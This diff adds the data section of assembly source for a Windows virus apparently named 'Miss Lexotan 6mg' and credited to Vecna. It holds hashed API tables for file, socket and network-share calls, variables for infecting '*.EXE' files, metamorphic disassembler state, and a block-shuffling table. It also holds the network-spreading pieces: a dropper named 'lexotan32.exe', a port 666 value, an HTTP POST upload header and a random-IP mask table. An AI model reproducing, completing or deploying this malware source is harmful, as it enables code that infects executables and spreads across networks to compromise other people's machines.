@@ -1,0 +1,615 @@
+MIXVAR macro sze, oft
+       dw sze
+       dw (ofs oft-ofs data_start)
+ENDM
+
+NUMBER_OF_CHANGES equ 30
+
+data_start:
+
+_E_ EQU 11h
+
+rsa_bit                  equ     1024
+
+bloco_0                  equ $
+rsa_n                    label   dword
+dd 0F356EB41h,0DF2E85D0h,048F39A6Bh,0F7AA0E12h
+dd 0721BF0BDh,0B1A8BD80h,045D29450h,0C74574E7h
+dd 01921E0BFh,04A229BE5h,0D00CF18Fh,0CC8B0936h
+dd 03233722Ch,09AB2CF47h,0E8848B51h,008986B1Ch
+dd 06F843DF8h,0337DB1FBh,0BE7A0E0Fh,00D9E6940h
+dd 0D7F72697h,076F9A5EEh,0203CA18Dh,0652DF911h
+dd 041E5C3BAh,0B060A463h,0F7EB6D38h,026A98752h
+dd 06DE5880Ah,0954A173Ch,013437B77h,06C878F33h
+dd 0
+bloco_0size equ $-bloco_0
+
+bloco1 equ $
+       db 'Miss Lexotan 6mg'
+copyright db ' (c) Vecna',0,0
+;         db ', garota...',0
+bloco1size equ $-bloco1
+
+bloco2 equ $
+include exepack.inc
+bloco2size equ $-bloco2
+
+bloco3 equ $
+api_kernel32_crc:
+       hash <GetSystemDirectoryA>
+       hash <ReadFile>
+       hash <WaitForMultipleObjects>
+       hash <Sleep>
+       hash <GlobalAlloc>
+       hash <GlobalFree>
+       hash <GetModuleHandleA>
+       hash <GetProcAddress>
+       hash <SetFileTime>
+       hash <SetFileAttributesA>
+       hash <FindFirstFileA>
+       hash <CreateFileA>
+       hash <CreateFileMappingA>
+       hash <MapViewOfFile>
+       hash <CloseHandle>
+       hash <UnmapViewOfFile>
+       hash <SetEndOfFile>
+       hash <SetFilePointer>
+       hash <ExitProcess>
+       hash <LoadLibraryA>
+       hash <FreeLibrary>
+       hash <WriteFile>
+       hash <GetStdHandle>
+       hash <lstrlenA>
+       hash <IsBadCodePtr>
+       hash <IsBadReadPtr>
+       hash <FindNextFileA>
+       hash <FindClose>
+       hash <GetTickCount>
+       hash <VirtualAlloc>
+       hash <VirtualFree>
+       hash <CreateThread>
+       hash <SetCurrentDirectoryA>
+       hash <GetDriveTypeA>
+       dd 0
+api_user32_crc:
+       hash <wsprintfA>
+       hash <MessageBoxA>
+       dd 0
+api_wsock32_crc:
+       hash <gethostname>
+       hash <gethostbyname>
+       hash <select>
+       hash <recvfrom>
+       hash <sendto>
+       hash <socket>
+       hash <closesocket>
+       hash <recv>
+       hash <send>
+       hash <connect>
+       hash <WSAStartup>
+       hash <WSACleanup>
+       dd 0
+api_mpr_crc:
+       hash <WNetCloseEnum>
+       hash <WNetEnumResourceA>
+       hash <WNetOpenEnumA>
+       dd 0
+bloco3size equ $-bloco3
+
+bloco4  equ $
+kernel32 db 'KERNEL32.DLL',0
+bloco4size equ $-bloco4
+
+bloco5  equ $
+user32   db 'USER32.DLL',0
+bloco5size equ $-bloco5
+
+bloco6  equ $
+wsock32  db 'WSOCK32.DLL',0
+bloco6size equ $-bloco6
+
+bloco7  equ $
+mpr      db 'MPR.DLL',0
+bloco7size equ $-bloco7
+
+bloco8  equ $
+search_mask db '*.EXE',0
+bloco8size equ $-bloco8
+
+bloco9  equ $
+bo_registry db "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",0
+bloco9size equ $-bloco9
+
+bloco10  equ $
+bo_name     db "lexotan32.exe",0
+bloco10size equ $-bloco10
+
+bloco11 equ $
+bo_port     db "666"
+bo_null     db 0
+bloco11size equ $-bloco11
+
+bloco12  equ $
+GMH    dd ofs _GMH
+bloco12size equ $-bloco12
+
+bloco13  equ $
+entrypoint dd ofs _exit
+bloco13size equ $-bloco13
+
+bloco14  equ $
+CODE_OFS dd 00401000h
+bloco14size equ $-bloco14
+
+bloco15  equ $
+CODE_SIZE dd (ofs vend-ofs vinit)
+bloco15size equ $-bloco15
+
+bloco16  equ $
+  X = ((ofs vend-ofs vinit)+0fffh) AND (NOT(0fffh))
+DATA_OFS dd 00401000h+X
+bloco16size equ $-bloco16
+
+bloco17  equ $
+  W = ((ofs data_end-ofs data_start)+0fffh) AND (NOT(0fffh))
+GENS_OFS dd 00401000h+X+W
+bloco17size equ $-bloco17
+
+bloco18  equ $
+bo_http_header db "POST /upload.cgi\ HTTP/1.0",13,10
+bo_http_header_size equ $-bo_http_header
+bloco18size equ $-bloco18
+
+bloco19  equ $
+bo_mime db "Content-Type: multipart/form-data"
+        db 03bh
+        db " boundary=----_LEXO32_",13,10
+        db "Content-length: "
+bo_size db "12345",13,10,13,10
+bo_bnd  db "----_LEXO32_"
+bo_bnd_size equ $-bo_bnd
+        db 13,10,"Content-Disposition: form-data"
+        db 03bh
+        db " name="
+        db 22h
+        db "filename"
+        db 22h
+        db 03bh
+        db " filename="
+        db 22h
+        db "lexotan32.exe"
+        db 22h
+        db 13,10
+        db "Content-Type: application/octet-stream",13,10,13,10
+bo_mime_size equ $-bo_mime
+bloco19size equ $-bloco19
+
+bloco20 equ $
+ip_mask_table:; DDCCBBAA
+       dd      0FFFFFFFFh  ;0     *.*.*.*   X=local
+       dd      0FFFFFF00h  ;1               *=random
+       dd      0FFFFFF00h  ;2     X.*.*.*
+       dd      0FFFFFF00h  ;3
+       dd      0FFFFFF00h  ;4
+       dd      0FFFF0000h  ;5     X.X.*.*
+       dd      0FFFF0000h  ;6
+       dd      0FFFF0000h  ;7
+bloco20size equ $-bloco20
+
+bloco21  equ $
+key1     dd 0
+bloco21size equ $-bloco21
+
+bloco22  equ $
+key2     dd 0
+bloco22size equ $-bloco22
+
+
+vbloco0 equ $
+api_addresses:
+       _GetSystemDirectoryA dd ?
+       _ReadFile           dd ?
+       _WaitForMultipleObjects dd ?
+       _Sleep              dd ?
+       _GlobalAlloc        dd ?
+       _GlobalFree         dd ?
+       _GetModuleHandleA   dd ?
+       _GetProcAddress     dd ?
+       _SetFileTime        dd ?
+       _SetFileAttributesA dd ?
+       _FindFirstFileA     dd ?
+       _CreateFileA        dd ?
+       _CreateFileMappingA dd ?
+       _MapViewOfFile      dd ?
+       _CloseHandle        dd ?
+       _UnmapViewOfFile    dd ?
+       _SetEndOfFile       dd ?
+       _SetFilePointer     dd ?
+       _ExitProcess        dd ?
+       _LoadLibraryA       dd ?
+       _FreeLibrary        dd ?
+       _WriteFile          dd ?
+       _GetStdHandle       dd ?
+       _lstrlenA           dd ?
+       _IsBadCodePtr       dd ?
+       _IsBadReadPtr       dd ?
+       _FindNextFileA      dd ?
+       _FindClose          dd ?
+       _GetTickCount       dd ?
+       _VirtualAlloc       dd ?
+       _VirtualFree        dd ?
+       _CreateThread       dd ?
+       _SetCurrentDirectoryA dd ?
+       _GetDriveType dd ?
+
+       _wsprintfA          dd ?
+       _MessageBoxA        dd ?
+
+       _gethostname dd ?
+       _gethostbyname dd ?
+       _select dd ?
+       _recvfrom dd ?
+       _sendto dd ?
+       _socket dd ?
+       _closesocket dd ?
+       _recv dd ?
+       _send dd ?
+       _connect dd ?
+       _WSAStartup dd ?
+       _WSACleanup dd ?
+
+       _WNetCloseEnum dd ?
+       _WNetEnumResourceA dd ?
+       _WNetOpenEnumA dd ?
+vbloco0size equ $-vbloco0
+
+vbloco1 equ $
+      insert_raw dd ?
+vbloco1size equ $-vbloco1
+
+vbloco2 equ $
+      insert_rva dd ?
+vbloco2size equ $-vbloco2
+
+vbloco3 equ $
+      resource dd ?
+vbloco3size equ $-vbloco3
+
+vbloco4 equ $
+      fmap dd ?
+vbloco4size equ $-vbloco4
+
+vbloco5 equ $
+      peheader dd ?
+vbloco5size equ $-vbloco5
+
+vbloco6 equ $
+      can_infect dd ?
+vbloco6size equ $-vbloco6
+
+vbloco7 equ $
+      fname dd ?
+vbloco7size equ $-vbloco7
+
+
+vbloco8 equ $
+      code_rva dd ?
+vbloco8size equ $-vbloco8
+
+vbloco9 equ $
+      data_rva dd ?
+vbloco9size equ $-vbloco9
+
+vbloco10 equ $
+      genotype_rva dd ?
+vbloco10size equ $-vbloco10
+
+vbloco11 equ $
+      data_raw dd ?
+vbloco11size equ $-vbloco11
+
+vbloco12 equ $
+      mutant_size dd ?
+vbloco12size equ $-vbloco12
+
+vbloco13 equ $
+      mutant_offset dd ?
+vbloco13size equ $-vbloco13
+
+vbloco14 equ $
+      mutant_gens dd ofs gens
+vbloco14size equ $-vbloco14
+
+
+vbloco15 equ $
+      seed dd ?
+vbloco15size equ $-vbloco15
+
+vbloco16 equ $
+      vbody dd ?
+vbloco16size equ $-vbloco16
+
+vbloco17 equ $
+      imagebase dd ?
+vbloco17size equ $-vbloco17
+
+
+vbloco18 equ $
+      next_section_start dd ?
+vbloco18size equ $-vbloco18
+
+
+vbloco19 equ $
+      disasm_offs dd ?
+vbloco19size equ $-vbloco19
+
+vbloco20 equ $
+      disasm_size dd ?
+vbloco20size equ $-vbloco20
+
+vbloco21 equ $
+      disasm_flag dd ?
+vbloco21size equ $-vbloco21
+
+vbloco22 equ $
+      disasm_mem dd ?
+vbloco22size equ $-vbloco22
+
+vbloco23 equ $
+      disasm_data dd ?
+vbloco23size equ $-vbloco23
+
+vbloco24 equ $
+      disasm_datarel dd ?
+vbloco24size equ $-vbloco24
+
+vbloco25 equ $
+      eip_table_cnt dd ?
+vbloco25size equ $-vbloco25
+
+vbloco26 equ $
+      jmp_table_cnt dd ?
+vbloco26size equ $-vbloco26
+
+vbloco27 equ $
+      eip_table dd ?
+vbloco27size equ $-vbloco27
+
+vbloco28 equ $
+      jmp_table dd ?
+vbloco28size equ $-vbloco28
+
+vbloco29 equ $
+      outbuffer dd ?
+vbloco29size equ $-vbloco29
+
+vbloco30 equ $
+      source dd ?
+vbloco30size equ $-vbloco30
+
+vbloco31 equ $
+      userlist dd ?
+vbloco31size equ $-vbloco31
+
+vbloco32 equ $
+      registers dd ?
+vbloco32size equ $-vbloco32
+
+
+vbloco33 equ $
+      _1st_item dd ?
+vbloco33size equ $-vbloco33
+
+
+vbloco34 equ $
+      rnddata   dd ?
+vbloco34size equ $-vbloco34
+
+
+vbloco35 equ $
+      dropper dd ?
+vbloco35size equ $-vbloco35
+
+vbloco36 equ $
+      dropper_size dd ?
+vbloco36size equ $-vbloco36
+
+
+vbloco37 equ $
+      this_ip dd ?
+vbloco37size equ $-vbloco37
+
+
+vbloco38 equ $
+      bo_ip dd ?
+vbloco38size equ $-vbloco38
+
+vbloco39 equ $
+      bo_seed   dd ?
+vbloco39size equ $-vbloco39
+
+vbloco40 equ $
+      bo_dropsize  dd ?
+vbloco40size equ $-vbloco40
+
+vbloco41 equ $
+      bo_dropper dd ?
+vbloco41size equ $-vbloco41
+
+
+vbloco42 equ $
+      epo_cnt dd ?
+vbloco42size equ $-vbloco42
+
+
+vbloco43 equ $
+      reloc db ?
+vbloco43size equ $-vbloco43
+
+vbloco44 equ $
+      disasm_seg db ?
+vbloco44size equ $-vbloco44
+
+vbloco45 equ $
+      disasm_rep db ?
+vbloco45size equ $-vbloco45
+
+vbloco46 equ $
+      disasm_opcode db ?
+vbloco46size equ $-vbloco46
+
+vbloco47 equ $
+      disasm_modrm db ?
+vbloco47size equ $-vbloco47
+
+vbloco48 equ $
+      disasm_modrm_mod db ?
+vbloco48size equ $-vbloco48
+
+vbloco49 equ $
+      disasm_modrm_reg db ?
+vbloco49size equ $-vbloco49
+
+vbloco50 equ $
+      disasm_modrm_rm db ?
+vbloco50size equ $-vbloco50
+
+vbloco51 equ $
+      disasm_sib db ?
+vbloco51size equ $-vbloco51
+
+vbloco52 equ $
+      disasm_sib_scale db ?
+vbloco52size equ $-vbloco52
+
+vbloco53 equ $
+      disasm_sib_index db ?
+vbloco53size equ $-vbloco53
+
+vbloco54 equ $
+      disasm_sib_base db ?
+vbloco54size equ $-vbloco54
+
+vbloco55 equ $
+      disasm_memsize db ?
+vbloco55size equ $-vbloco55
+
+vbloco56 equ $
+      disasm_datasize db ?
+vbloco56size equ $-vbloco56
+
+vbloco57 equ $
+      droppergen db -1
+vbloco57size equ $-vbloco57
+
+NUMBER_OF_VAR_BLOCKS = 58+23+3
+
+bloco000 equ $
+order_var_table db NUMBER_OF_VAR_BLOCKS dup (?)
+bloco000size equ $-bloco000
+
+bloco00 equ $
+new_var_table dd NUMBER_OF_VAR_BLOCKS*2 dup (?)
+bloco00size equ $-bloco00
+
+V_VARDEF EQU 01000000000000000b      ;8000h
+V_UNVAR  EQU 00100000000000000b      ;4000h
+
+bloco0 equ $
+var_table:
+      ;size,ofs
+       MIXVAR  bloco_0size,bloco_0
+       MIXVAR  bloco1size,bloco1
+       MIXVAR  bloco2size,bloco2
+       MIXVAR  bloco3size,bloco3
+       MIXVAR  bloco4size,bloco4
+       MIXVAR  bloco5size,bloco5
+       MIXVAR  bloco6size,bloco6
+       MIXVAR  bloco7size,bloco7
+       MIXVAR  bloco8size,bloco8
+       MIXVAR  bloco9size,bloco9
+       MIXVAR  bloco10size,bloco10
+       MIXVAR  bloco11size,bloco11
+       MIXVAR  bloco12size,bloco12
+       MIXVAR  bloco13size,bloco13
+       MIXVAR  bloco14size,bloco14
+       MIXVAR  bloco15size,bloco15
+       MIXVAR  bloco16size,bloco16
+       MIXVAR  bloco17size,bloco17
+       MIXVAR  bloco18size,bloco18
+       MIXVAR  bloco19size,bloco19
+       MIXVAR  bloco20size,bloco20
+       MIXVAR  bloco21size,bloco21
+       MIXVAR  bloco22size,bloco22
+
+       MIXVAR  V_UNVAR+vbloco0size,vbloco0
+       MIXVAR  V_UNVAR+vbloco1size,vbloco1
+       MIXVAR  V_UNVAR+vbloco2size,vbloco2
+       MIXVAR  V_UNVAR+vbloco3size,vbloco3
+       MIXVAR  V_UNVAR+vbloco4size,vbloco4
+       MIXVAR  V_UNVAR+vbloco5size,vbloco5
+       MIXVAR  V_UNVAR+vbloco6size,vbloco6
+       MIXVAR  V_UNVAR+vbloco7size,vbloco7
+       MIXVAR  V_UNVAR+vbloco8size,vbloco8
+       MIXVAR  V_UNVAR+vbloco9size,vbloco9
+       MIXVAR  V_UNVAR+vbloco10size,vbloco10
+       MIXVAR  V_UNVAR+vbloco11size,vbloco11
+       MIXVAR  V_UNVAR+vbloco12size,vbloco12
+       MIXVAR  V_UNVAR+vbloco13size,vbloco13
+       MIXVAR  V_UNVAR+vbloco14size,vbloco14
+       MIXVAR  V_UNVAR+vbloco15size,vbloco15
+       MIXVAR  V_UNVAR+vbloco16size,vbloco16
+       MIXVAR  V_UNVAR+vbloco17size,vbloco17
+       MIXVAR  V_UNVAR+vbloco18size,vbloco18
+       MIXVAR  V_UNVAR+vbloco19size,vbloco19
+       MIXVAR  V_UNVAR+vbloco20size,vbloco20
+       MIXVAR  V_UNVAR+vbloco21size,vbloco21
+       MIXVAR  V_UNVAR+vbloco22size,vbloco22
+       MIXVAR  V_UNVAR+vbloco23size,vbloco23
+       MIXVAR  V_UNVAR+vbloco24size,vbloco24
+       MIXVAR  V_UNVAR+vbloco25size,vbloco25
+       MIXVAR  V_UNVAR+vbloco26size,vbloco26
+       MIXVAR  V_UNVAR+vbloco27size,vbloco27
+       MIXVAR  V_UNVAR+vbloco28size,vbloco28
+       MIXVAR  V_UNVAR+vbloco29size,vbloco29
+       MIXVAR  V_UNVAR+vbloco30size,vbloco30
+       MIXVAR  V_UNVAR+vbloco31size,vbloco31
+       MIXVAR  V_UNVAR+vbloco32size,vbloco32
+       MIXVAR  V_UNVAR+vbloco33size,vbloco33
+       MIXVAR  V_UNVAR+vbloco34size,vbloco34
+       MIXVAR  V_UNVAR+vbloco35size,vbloco35
+       MIXVAR  V_UNVAR+vbloco36size,vbloco36
+       MIXVAR  V_UNVAR+vbloco37size,vbloco37
+       MIXVAR  V_UNVAR+vbloco38size,vbloco38
+       MIXVAR  V_UNVAR+vbloco39size,vbloco39
+       MIXVAR  V_UNVAR+vbloco40size,vbloco40
+       MIXVAR  V_UNVAR+vbloco41size,vbloco41
+       MIXVAR  V_UNVAR+vbloco42size,vbloco42
+       MIXVAR  V_UNVAR+vbloco43size,vbloco43
+       MIXVAR  V_UNVAR+vbloco44size,vbloco44
+       MIXVAR  V_UNVAR+vbloco45size,vbloco45
+       MIXVAR  V_UNVAR+vbloco46size,vbloco46
+       MIXVAR  V_UNVAR+vbloco47size,vbloco47
+       MIXVAR  V_UNVAR+vbloco48size,vbloco48
+       MIXVAR  V_UNVAR+vbloco49size,vbloco49
+       MIXVAR  V_UNVAR+vbloco50size,vbloco50
+       MIXVAR  V_UNVAR+vbloco51size,vbloco51
+       MIXVAR  V_UNVAR+vbloco52size,vbloco52
+       MIXVAR  V_UNVAR+vbloco53size,vbloco53
+       MIXVAR  V_UNVAR+vbloco54size,vbloco54
+       MIXVAR  V_UNVAR+vbloco55size,vbloco55
+       MIXVAR  V_UNVAR+vbloco56size,vbloco56
+       MIXVAR  V_UNVAR+vbloco57size,vbloco57
+
+       MIXVAR  V_UNVAR+bloco000size,bloco000
+       MIXVAR  V_UNVAR+bloco00size,bloco00
+       MIXVAR  V_VARDEF+bloco0size,bloco0
+bloco0size equ $-bloco0
+
+
+
+data_end equ $
+
+align 4
+  data_size equ $-data_start
+
